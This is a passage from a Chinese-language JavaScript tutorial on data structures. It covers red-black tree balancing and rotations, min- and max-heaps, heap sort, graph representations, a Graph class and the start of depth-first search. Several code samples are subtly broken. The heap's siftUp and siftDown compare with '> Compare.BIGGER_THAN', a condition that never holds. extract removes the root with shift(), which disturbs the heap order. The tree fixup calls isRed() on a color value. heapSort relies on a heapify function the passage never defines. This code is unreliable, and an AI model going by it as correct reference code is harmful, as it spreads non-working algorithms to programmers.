    <span>}</span> <span>else</span> <span>if</span> <span>(</span>node<span>.</span>right <span>==</span> <span>null</span><span>)</span> <span>{</span>
      node<span>.</span>right <span>=</span> <span>new</span> <span>RedBlackNode</span><span>(</span>key<span>)</span>
      node<span>.</span>right<span>.</span>parent <span>=</span> node
      <span>return</span> node<span>.</span>right
    <span>}</span> <span>else</span> <span>{</span>
      <span>return</span> <span>this</span><span>.</span><span>insertNode</span><span>(</span>node<span>.</span>right<span>,</span> key<span>)</span>
    <span>}</span>
  <span>}</span>
  <span>fixTreeProperties</span><span>(</span><span>node</span><span>)</span> <span>{</span>
    <span>while</span> <span>(</span>
      node <span>&amp;&amp;</span>
      node<span>.</span>parent <span>&amp;&amp;</span>
      node<span>.</span>parent<span>.</span>color<span>.</span><span>isRed</span><span>(</span><span>)</span> <span>&amp;&amp;</span>
      node<span>.</span>color <span>!==</span> Colors<span>.</span><span>BLACK</span>
    <span>)</span> <span>{</span>
      <span>let</span> parent <span>=</span> node<span>.</span>parent
      <span>const</span> grandParent <span>=</span> parent<span>.</span>parent
      <span>// 情形 A：父节点是左侧子节点</span>
      <span>if</span> <span>(</span>grandParent <span>&amp;&amp;</span> grandParent<span>.</span>left <span>===</span> parent<span>)</span> <span>{</span>
        <span>const</span> uncle <span>=</span> grandParent<span>.</span>right
        <span>// 情形 1A：叔节点也是红色——只需要重新填色</span>
        <span>if</span> <span>(</span>uncle <span>&amp;&amp;</span> uncle<span>.</span>color <span>===</span> Colors<span>.</span><span>RED</span><span>)</span> <span>{</span>
          grandParent<span>.</span>color <span>=</span> Colors<span>.</span><span>RED</span>
          parent<span>.</span>color <span>=</span> Colors<span>.</span><span>BLACK</span>
          uncle<span>.</span>color <span>=</span> Colors<span>.</span><span>BLACK</span>
          node <span>=</span> grandParent
        <span>}</span> <span>else</span> <span>{</span>
          <span>// 情形 2A：节点是右侧子节点——左旋转</span>
          <span>if</span> <span>(</span>node <span>===</span> parent<span>.</span>right<span>)</span> <span>{</span>
            <span>this</span><span>.</span><span>rotationRR</span><span>(</span>parent<span>)</span>
            node <span>=</span> parent
            parent <span>=</span> node<span>.</span>parent
          <span>}</span>
          <span>// 情形 3A：节点是左侧子节点——右旋转</span>
          <span>this</span><span>.</span><span>rotationLL</span><span>(</span>grandParent<span>)</span>
          parent<span>.</span>color <span>=</span> Colors<span>.</span><span>BLACK</span>
          grandParent<span>.</span>color <span>=</span> Colors<span>.</span><span>RED</span>
          node <span>=</span> parent
        <span>}</span>
      <span>}</span> <span>else</span> <span>{</span>
        <span>// 情形 B：父节点是右侧子节点</span>
        <span>const</span> uncle <span>=</span> grandParent<span>.</span>left
        <span>// 情形 1B：叔节点是红色——只需要重新填色</span>
        <span>if</span> <span>(</span>uncle <span>&amp;&amp;</span> uncle<span>.</span>color <span>===</span> Colors<span>.</span><span>RED</span><span>)</span> <span>{</span>
          grandParent<span>.</span>color <span>=</span> Colors<span>.</span><span>RED</span>
          parent<span>.</span>color <span>=</span> Colors<span>.</span><span>BLACK</span>
          uncle<span>.</span>color <span>=</span> Colors<span>.</span><span>BLACK</span>
          node <span>=</span> grandParent
        <span>}</span> <span>else</span> <span>{</span>
          <span>// 情形 2B：节点是左侧子节点——右旋转</span>
          <span>if</span> <span>(</span>node <span>===</span> parent<span>.</span>left<span>)</span> <span>{</span>
            <span>this</span><span>.</span><span>rotationLL</span><span>(</span>parent<span>)</span>
            node <span>=</span> parent
            parent <span>=</span> node<span>.</span>parent
          <span>}</span>
          <span>// 情形 3B：节点是右侧子节点——左旋转</span>
          <span>this</span><span>.</span><span>rotationRR</span><span>(</span>grandParent<span>)</span>
          parent<span>.</span>color <span>=</span> Colors<span>.</span><span>BLACK</span>
          grandParent<span>.</span>color <span>=</span> Colors<span>.</span><span>RED</span>
          node <span>=</span> parent
        <span>}</span>
      <span>}</span>
    <span>}</span>
    <span>this</span><span>.</span>root<span>.</span>color <span>=</span> Colors<span>.</span><span>BLACK</span>
  <span>}</span>
  <span>rotationLL</span><span>(</span><span>node</span><span>)</span> <span>{</span>
    <span>const</span> tmp <span>=</span> node<span>.</span>left
    node<span>.</span>left <span>=</span> tmp<span>.</span>right
    <span>if</span> <span>(</span>tmp<span>.</span>right <span>&amp;&amp;</span> tmp<span>.</span>right<span>.</span>key<span>)</span> <span>{</span>
      tmp<span>.</span>right<span>.</span>parent <span>=</span> node
    <span>}</span>
    tmp<span>.</span>parent <span>=</span> node<span>.</span>parent
    <span>if</span> <span>(</span><span>!</span>node<span>.</span>parent<span>)</span> <span>{</span>
      <span>this</span><span>.</span>root <span>=</span> tmp
    <span>}</span> <span>else</span> <span>{</span>
      <span>if</span> <span>(</span>node <span>===</span> node<span>.</span>parent<span>.</span>left<span>)</span> <span>{</span>
        node<span>.</span>parent<span>.</span>left <span>=</span> tmp
      <span>}</span> <span>else</span> <span>{</span>
        node<span>.</span>parent<span>.</span>right <span>=</span> tmp
      <span>}</span>
    <span>}</span>
    tmp<span>.</span>right <span>=</span> node
    node<span>.</span>parent <span>=</span> tmp
  <span>}</span>
  <span>rotationRR</span><span>(</span><span>node</span><span>)</span> <span>{</span>
    <span>const</span> tmp <span>=</span> node<span>.</span>right
    node<span>.</span>right <span>=</span> tmp<span>.</span>left
    <span>if</span> <span>(</span>tmp<span>.</span>left <span>&amp;&amp;</span> tmp<span>.</span>left<span>.</span>key<span>)</span> <span>{</span>
      tmp<span>.</span>left<span>.</span>parent <span>=</span> node
    <span>}</span>
    tmp<span>.</span>parent <span>=</span> node<span>.</span>parent
    <span>if</span> <span>(</span><span>!</span>node<span>.</span>parent<span>)</span> <span>{</span>
      <span>this</span><span>.</span>root <span>=</span> tmp
    <span>}</span> <span>else</span> <span>{</span>
      <span>if</span> <span>(</span>node <span>===</span> node<span>.</span>parent<span>.</span>left<span>)</span> <span>{</span>
        node<span>.</span>parent<span>.</span>left <span>=</span> tmp
      <span>}</span> <span>else</span> <span>{</span>
        node<span>.</span>parent<span>.</span>right <span>=</span> tmp
      <span>}</span>
    <span>}</span>
    tmp<span>.</span>left <span>=</span> node
    node<span>.</span>parent <span>=</span> tmp
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br><span>100</span><br><span>101</span><br><span>102</span><br><span>103</span><br><span>104</span><br><span>105</span><br><span>106</span><br><span>107</span><br><span>108</span><br><span>109</span><br><span>110</span><br><span>111</span><br><span>112</span><br><span>113</span><br><span>114</span><br><span>115</span><br><span>116</span><br><span>117</span><br><span>118</span><br><span>119</span><br><span>120</span><br><span>121</span><br><span>122</span><br><span>123</span><br><span>124</span><br><span>125</span><br><span>126</span><br><span>127</span><br><span>128</span><br><span>129</span><br><span>130</span><br><span>131</span><br><span>132</span><br><span>133</span><br><span>134</span><br><span>135</span><br><span>136</span><br><span>137</span><br><span>138</span><br><span>139</span><br><span>140</span><br><span>141</span><br></div></div><h2 id="_24-二叉堆数据结构"> 24. 二叉堆数据结构</h2>
<ul>
<li>
<p>二叉堆是计算机科学中一种非常著名的数据结构，由于它能高效、快速地找出最大值和最小值，常被应用于优先队列。它也被用于著名的堆排序算法中。</p>
</li>
<li>
<p>二叉堆是一种特殊的二叉树，有以下两个特性。</p>
<ol>
<li>它是一棵完全二叉树，表示树的每一层都有左侧和右侧子节点（除了最后一层的叶节点），并且最后一层的叶节点尽可能都是左侧子节点，这叫作结构特性。</li>
<li>二叉堆不是最小堆就是最大堆。最小堆允许你快速导出树的最小值，最大堆允许你快速导出树的最大值。所有的节点都大于等于（最大堆）或小于等于（最小堆）每个它的子节点。这叫作堆特性。</li>
</ol>
</li>
<li>
<p>尽管二叉堆是二叉树，但并不一定是二叉搜索树（BST）。在二叉堆中，每个子节点都要大于等于父节点（最小堆）或小于等于父节点（最大堆）。然而在二叉搜索树中，左侧子节点总是比父节点小，右侧子节点也总是更大。</p>
</li>
<li>
<p>创建最小堆类</p>
</li>
</ul>
<div><pre><code><span>function</span> <span>swap</span><span>(</span><span>array<span>,</span> a<span>,</span> b</span><span>)</span> <span>{</span>
  <span>const</span> temp <span>=</span> array<span>[</span>a<span>]</span>
  array<span>[</span>a<span>]</span> <span>=</span> array<span>[</span>b<span>]</span>
  array<span>[</span>b<span>]</span> <span>=</span> temp
<span>}</span>

<span>class</span> <span>MinHeap</span> <span>{</span>
  <span>constructor</span><span>(</span><span>compareFn <span>=</span> defaultCompare</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>compareFn <span>=</span> compareFn
    <span>this</span><span>.</span>heap <span>=</span> <span>[</span><span>]</span>
  <span>}</span>
  <span>getLeftIndex</span><span>(</span><span>index</span><span>)</span> <span>{</span>
    <span>return</span> <span>2</span> <span>*</span> index <span>+</span> <span>1</span>
  <span>}</span>
  <span>getRightIndex</span><span>(</span><span>index</span><span>)</span> <span>{</span>
    <span>return</span> <span>2</span> <span>*</span> index <span>+</span> <span>2</span>
  <span>}</span>
  <span>getParentIndex</span><span>(</span><span>index</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>index <span>===</span> <span>0</span><span>)</span> <span>{</span>
      <span>return</span> <span>undefined</span>
    <span>}</span>
    <span>return</span> Math<span>.</span><span>floor</span><span>(</span><span>(</span>index <span>-</span> <span>1</span><span>)</span> <span>/</span> <span>2</span><span>)</span>
  <span>}</span>
  <span>// 向堆中插入值</span>
  <span>insert</span><span>(</span><span>value</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>value <span>!=</span> <span>null</span><span>)</span> <span>{</span>
      <span>this</span><span>.</span>heap<span>.</span><span>push</span><span>(</span>value<span>)</span>
      <span>this</span><span>.</span><span>siftUp</span><span>(</span><span>this</span><span>.</span>heap<span>.</span>length <span>-</span> <span>1</span><span>)</span>
      <span>return</span> <span>true</span>
    <span>}</span>
    <span>return</span> <span>false</span>
  <span>}</span>
  <span>// 上移操作</span>
  <span>siftUp</span><span>(</span><span>index</span><span>)</span> <span>{</span>
    <span>let</span> parent <span>=</span> <span>this</span><span>.</span><span>getParentIndex</span><span>(</span>index<span>)</span>
    <span>while</span> <span>(</span>
      index <span>></span> <span>0</span> <span>&amp;&amp;</span>
      <span>this</span><span>.</span><span>compareFn</span><span>(</span><span>this</span><span>.</span>heap<span>[</span>parent<span>]</span><span>,</span> <span>this</span><span>.</span>heap<span>[</span>index<span>]</span><span>)</span> <span>></span> Compare<span>.</span><span>BIGGER_THAN</span>
    <span>)</span> <span>{</span>
      <span>swap</span><span>(</span><span>this</span><span>.</span>heap<span>,</span> parent<span>,</span> index<span>)</span>
      index <span>=</span> parent
      parent <span>=</span> <span>this</span><span>.</span><span>getParentIndex</span><span>(</span>index<span>)</span>
    <span>}</span>
  <span>}</span>
  <span>size</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>this</span><span>.</span>heap<span>.</span>length
  <span>}</span>
  <span>isEmpty</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>this</span><span>.</span><span>size</span><span>(</span><span>)</span> <span>===</span> <span>0</span>
  <span>}</span>
  <span>// 寻找最小值</span>
  <span>findMinimum</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>this</span><span>.</span><span>isEmpty</span><span>(</span><span>)</span> <span>?</span> <span>undefined</span> <span>:</span> <span>this</span><span>.</span>heap<span>[</span><span>0</span><span>]</span>
  <span>}</span>
  <span>// 导出堆中的最小值或最大值</span>
  <span>extract</span><span>(</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>this</span><span>.</span><span>isEmpty</span><span>(</span><span>)</span><span>)</span> <span>{</span>
      <span>return</span> <span>undefined</span>
    <span>}</span>
    <span>if</span> <span>(</span><span>this</span><span>.</span><span>size</span><span>(</span><span>)</span> <span>===</span> <span>1</span><span>)</span> <span>{</span>
      <span>return</span> <span>this</span><span>.</span>heap<span>.</span><span>shift</span><span>(</span><span>)</span>
    <span>}</span>
    <span>const</span> removedValue <span>=</span> <span>this</span><span>.</span>heap<span>.</span><span>shift</span><span>(</span><span>)</span>
    <span>this</span><span>.</span><span>siftDown</span><span>(</span><span>0</span><span>)</span>
    <span>return</span> removedValue
  <span>}</span>
  <span>// 下移操作（堆化）</span>
  <span>siftDown</span><span>(</span><span>index</span><span>)</span> <span>{</span>
    <span>let</span> element <span>=</span> index
    <span>const</span> left <span>=</span> <span>this</span><span>.</span><span>getLeftIndex</span><span>(</span>index<span>)</span>
    <span>const</span> right <span>=</span> <span>this</span><span>.</span><span>getRightIndex</span><span>(</span>index<span>)</span>
    <span>const</span> size <span>=</span> <span>this</span><span>.</span><span>size</span><span>(</span><span>)</span>
    <span>if</span> <span>(</span>
      left <span>&lt;</span> size <span>&amp;&amp;</span>
      <span>this</span><span>.</span><span>compareFn</span><span>(</span><span>this</span><span>.</span>heap<span>[</span>element<span>]</span><span>,</span> <span>this</span><span>.</span>heap<span>[</span>left<span>]</span><span>)</span> <span>></span> Compare<span>.</span><span>BIGGER_THAN</span>
    <span>)</span> <span>{</span>
      element <span>=</span> left
    <span>}</span>
    <span>if</span> <span>(</span>
      right <span>&lt;</span> size <span>&amp;&amp;</span>
      <span>this</span><span>.</span><span>compareFn</span><span>(</span><span>this</span><span>.</span>heap<span>[</span>element<span>]</span><span>,</span> <span>this</span><span>.</span>heap<span>[</span>right<span>]</span><span>)</span> <span>></span> Compare<span>.</span><span>BIGGER_THAN</span>
    <span>)</span> <span>{</span>
      element <span>=</span> right
    <span>}</span>
    <span>if</span> <span>(</span>index <span>!==</span> element<span>)</span> <span>{</span>
      <span>swap</span><span>(</span><span>this</span><span>.</span>heap<span>,</span> index<span>,</span> element<span>)</span>
      <span>this</span><span>.</span><span>siftDown</span><span>(</span>element<span>)</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br></div></div><ul>
<li>
<p>创建最大堆类</p>
<blockquote>
<p>MaxHeap 类的算法和 MinHeap 类的算法一模一样。不同之处在于我们要把所有 &gt; （大于）的比较换成 &lt; （小于）的比较。</p>
</blockquote>
</li>
</ul>
<div><pre><code><span>function</span> <span>reverseCompare</span><span>(</span><span>compareFn</span><span>)</span> <span>{</span>
  <span>return</span> <span>(</span><span>a<span>,</span> b</span><span>)</span> <span>=></span> <span>compareFn</span><span>(</span>b<span>,</span> a<span>)</span>
<span>}</span>

<span>class</span> <span>MaxHeap</span> <span>extends</span> <span>MinHeap</span> <span>{</span>
  <span>constructor</span><span>(</span><span>compareFn <span>=</span> defaultCompare</span><span>)</span> <span>{</span>
    <span>super</span><span>(</span>compareFn<span>)</span>
    <span>this</span><span>.</span>compareFn <span>=</span> <span>reverseCompare</span><span>(</span>compareFn<span>)</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><h2 id="_25-堆排序算法"> 25. 堆排序算法</h2>
<ul>
<li>
<p>我们可以使用二叉堆数据结构来帮助我们创建一个非常著名的排序算法：堆排序算法。它包含下面三个步骤。</p>
<ol>
<li>用数组创建一个最大堆用作源数据。</li>
<li>在创建最大堆后，最大的值会被存储在堆的第一个位置。我们要将它替换为堆的最后一个值，将堆的大小减 1。</li>
<li>最后，我们将堆的根节点下移并重复步骤 2 直到堆的大小为 1。</li>
</ol>
</li>
<li>
<p>heapify 函数和我们创建的 siftDown 方法有相同的代码。不同之处是我们会将堆本身、堆的大小和要使用的比较函数传入作为参数。这是因为我们不会直接使用堆数据结构，而是使用它的逻辑来开发 heapSort 算法。</p>
</li>
</ul>
<img :src="$withBase('/images/JS-Algorithms/堆排序算法.png')" loading="lazy">
<div><pre><code><span>function</span> <span>heapSort</span><span>(</span><span>array<span>,</span> compareFn <span>=</span> defaultCompare</span><span>)</span> <span>{</span>
  <span>let</span> heapSize <span>=</span> array<span>.</span>length
  <span>buildMaxHeap</span><span>(</span>array<span>,</span> compareFn<span>)</span>
  <span>while</span> <span>(</span>heapSize <span>></span> <span>1</span><span>)</span> <span>{</span>
    <span>swap</span><span>(</span>array<span>,</span> <span>0</span><span>,</span> <span>--</span>heapSize<span>)</span>
    <span>heapify</span><span>(</span>array<span>,</span> <span>0</span><span>,</span> heapSize<span>,</span> compareFn<span>)</span>
  <span>}</span>
  <span>return</span> array
<span>}</span>

<span>function</span> <span>buildMaxHeap</span><span>(</span><span>array<span>,</span> compareFn</span><span>)</span> <span>{</span>
  <span>for</span> <span>(</span><span>let</span> i <span>=</span> Math<span>.</span><span>floor</span><span>(</span>array<span>.</span>length <span>/</span> <span>2</span><span>)</span><span>;</span> i <span>>=</span> <span>0</span><span>;</span> i <span>-=</span> <span>1</span><span>)</span> <span>{</span>
    <span>heapify</span><span>(</span>array<span>,</span> i<span>,</span> array<span>.</span>length<span>,</span> compareFn<span>)</span>
  <span>}</span>
  <span>return</span> array
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><h2 id="_26-图的相关术语"> 26. 图的相关术语</h2>
<ul>
<li>
<p>图是网络结构的抽象模型。图是一组由边连接的节点（或顶点）。学习图是重要的，因为任何二元关系都可以用图来表示。</p>
</li>
<li>
<p>有向图和无向图：图可以是无向的（边没有方向）或是有向的（有向图）。</p>
</li>
</ul>
<h2 id="_27-图的表示"> 27. 图的表示</h2>
<ul>
<li>邻接矩阵：图最常见的实现是邻接矩阵。每个节点都和一个整数相关联，该整数将作为数组的索引。我们用一个二维数组来表示顶点之间的连接。</li>
</ul>
<img :src="$withBase('/images/JS-Algorithms/图的表示-邻接矩阵.png')" loading="lazy">
<ul>
<li>邻接表：邻接表由图中每个顶点的相邻顶点列表所组成。存在好几种方式来表示这种数据结构。我们可以用列表（数组）、链表，甚至是散列表或是字典来表示相邻顶点列表。</li>
</ul>
<img :src="$withBase('/images/JS-Algorithms/图的表示-邻接表.png')" loading="lazy">
<ul>
<li>关联矩阵：还可以用关联矩阵来表示图。在关联矩阵中，矩阵的行表示顶点，列表示边。</li>
</ul>
<img :src="$withBase('/images/JS-Algorithms/图的表示-关联矩阵.png')" loading="lazy">
<h2 id="_28-创建-graph-类"> 28. 创建 Graph 类</h2>
<div><pre><code><span>class</span> <span>Graph</span> <span>{</span>
  <span>constructor</span><span>(</span><span>isDirected <span>=</span> <span>false</span></span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>isDirected <span>=</span> isDirected
    <span>this</span><span>.</span>vertices <span>=</span> <span>[</span><span>]</span>
    <span>this</span><span>.</span>adjList <span>=</span> <span>new</span> <span>Dictionary</span><span>(</span><span>)</span>
  <span>}</span>
  <span>// 这个方法接收顶点 v 作为参数。只有在这个顶点不存在于图中时我们将该顶点添加到顶点列表中，并且在邻接表中，设置顶点 v 作为键对应的字典值为一个空数组。</span>
  <span>addVertex</span><span>(</span><span>v</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>!</span><span>this</span><span>.</span>vertices<span>.</span><span>includes</span><span>(</span>v<span>)</span><span>)</span> <span>{</span>
      <span>this</span><span>.</span>vertices<span>.</span><span>push</span><span>(</span>v<span>)</span>
      <span>this</span><span>.</span>adjList<span>.</span><span>set</span><span>(</span>v<span>,</span> <span>[</span><span>]</span><span>)</span>
    <span>}</span>
  <span>}</span>
  <span>// 这个方法接收两个顶点作为参数，也就是我们要建立连接的两个顶点。在连接顶点之前，需要验证顶点是否存在于图中。如果顶点 v 或 w 不存在于图中，要将它们加入顶点列表。</span>
  <span>addEdge</span><span>(</span><span>v<span>,</span> w</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>!</span><span>this</span><span>.</span>adjList<span>.</span><span>get</span><span>(</span>v<span>)</span><span>)</span> <span>{</span>
      <span>this</span><span>.</span><span>addVertex</span><span>(</span>v<span>)</span>
    <span>}</span>
    <span>if</span> <span>(</span><span>!</span><span>this</span><span>.</span>adjList<span>.</span><span>get</span><span>(</span>w<span>)</span><span>)</span> <span>{</span>
      <span>this</span><span>.</span><span>addVertex</span><span>(</span>w<span>)</span>
    <span>}</span>
    <span>this</span><span>.</span>adjList<span>.</span><span>get</span><span>(</span>v<span>)</span><span>.</span><span>push</span><span>(</span>w<span>)</span>
    <span>if</span> <span>(</span><span>!</span><span>this</span><span>.</span>isDirected<span>)</span> <span>{</span>
      <span>this</span><span>.</span>adjList<span>.</span><span>get</span><span>(</span>w<span>)</span><span>.</span><span>push</span><span>(</span>v<span>)</span>
    <span>}</span>
  <span>}</span>
  <span>// 返回顶点列表</span>
  <span>getVertices</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>this</span><span>.</span>vertices
  <span>}</span>
  <span>// 返回邻接表</span>
  <span>getAdjList</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>this</span><span>.</span>adjList
  <span>}</span>
  <span>toString</span><span>(</span><span>)</span> <span>{</span>
    <span>let</span> s <span>=</span> <span>''</span>
    <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> <span>this</span><span>.</span>vertices<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
      s <span>+=</span> <span><span>`</span><span><span>${</span><span>this</span><span>.</span>vertices<span>[</span>i<span>]</span><span>}</span></span><span> -> </span><span>`</span></span>
      <span>const</span> neighbors <span>=</span> <span>this</span><span>.</span>adjList<span>.</span><span>get</span><span>(</span><span>this</span><span>.</span>vertices<span>[</span>i<span>]</span><span>)</span>
      <span>for</span> <span>(</span><span>let</span> j <span>=</span> <span>0</span><span>;</span> j <span>&lt;</span> neighbors<span>.</span>length<span>;</span> j<span>++</span><span>)</span> <span>{</span>
        s <span>+=</span> <span><span>`</span><span><span>${</span>neighbors<span>[</span>j<span>]</span><span>}</span></span><span> </span><span>`</span></span>
      <span>}</span>
      s <span>+=</span> <span>'\n'</span>
    <span>}</span>
    <span>return</span> s
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br></div></div><h2 id="_29-图的遍历"> 29. 图的遍历</h2>
<ul>
<li>
<p>和树数据结构类似，我们可以访问图的所有节点。有两种算法可以对图进行遍历：广度优先搜索（breadth-first search，BFS）和深度优先搜索（depth-first search，DFS）。图遍历可以用来寻找特定的顶点或寻找两个顶点之间的路径，检查图是否连通，检查图是否含有环，等等。</p>
</li>
<li>
<p>当要标注已经访问过的顶点时，我们用三种颜色来反映它们的状态。</p>
<ol>
<li>白色：表示该顶点还没有被访问。</li>
<li>灰色：表示该顶点被访问过，但并未被探索过。</li>
<li>黑色：表示该顶点被访问过且被完全探索过。</li>
</ol>
</li>
</ul>
<div><pre><code><span>const</span> Colors <span>=</span> <span>{</span>
  <span>WHITE</span><span>:</span> <span>0</span><span>,</span>
  <span>GREY</span><span>:</span> <span>1</span><span>,</span>
  <span>BLACK</span><span>:</span> <span>2</span><span>,</span>
<span>}</span>

<span>// 初始化每个顶点的颜色</span>
<span>const</span> <span>initializeColor</span> <span>=</span> <span>vertices</span> <span>=></span> <span>{</span>
  <span>const</span> color <span>=</span> <span>{</span><span>}</span>
  <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> vertices<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
    color<span>[</span>vertices<span>[</span>i<span>]</span><span>]</span> <span>=</span> Colors<span>.</span><span>WHITE</span>
  <span>}</span>
  <span>return</span> color
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div><ul>
<li>
<p>深度优先搜索</p>
<blockquote>
<ul>
<li>数据结构：栈</li>
<li>描述：将顶点存入栈，顶点是沿着路径被探索的，存在新的相邻顶点就去访问</li>
</ul>
</blockquote>
<img :src="$withBase('/images/JS-Algorithms/图的遍历-深度优先搜索.png')" loading="lazy">
</li>
</ul>
<div><pre><code><span>const</span> <span>depthFirstSearch</span> <span>=</span> <span>(</span><span>graph<span>,</span> callback</span><span>)</span> <span>=></span> <span>{</span>
  <span>const</span> vertices <span>=</span> graph<span>.</span><span>getVertices</span><span>(</span><span>)</span>
  <span>const</span> adjList <span>=</span> graph<span>.</span><span>getAdjList</span><span>(</span><span>)</span>
  <span>const</span> color <span>=</span> <span>initializeColor</span><span>(</span>vertices<span>)</span>
  <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> vertices<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>color<span>[</span>vertices<span>[</span>i<span>]</span><span>]</span> <span>===</span> Colors<span>.</span><span>WHITE</span><span>)</span> <span>{</span>
      <span>depthFirstSearchVisit</span><span>(</span>vertices<span>[</span>i<span>]</span><span>,</span> color<span>,</span> adjList<span>,</span> callback<span>)</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
<span>const</span> <span>depthFirstSearchVisit</span> <span>=</span> <span>(</span><span>u<span>,</span> color<span>,</span> adjList<span>,</span> callback</span><span>)</span> <span>=></span> <span>{</span>
  color<span>[</span>u<span>]</span> <span>=</span> Colors<span>.</span><span>GREY</span>
  <span>if</span> <span>(</span>callback<span>)</span> <span>{</span>
    <span>callback</span><span>(</span>u<span>)</span>
  <span>}</span>
  <span>// 邻接表</span>
  <span>const</span> neighbors <span>=</span> adjList<span>.</span><span>get</span><span>(</span>u<span>)</span>
  <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> neighbors<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
    <span>const</span> w <span>=</span> neighbors<span>[</span>i<span>]</span>
    <span>if</span> <span>(</span>color<span>[</span>w<span>]</span> <span>===</span> Colors<span>.</span><span>WHITE</span><span>)</span> <span>{</span>
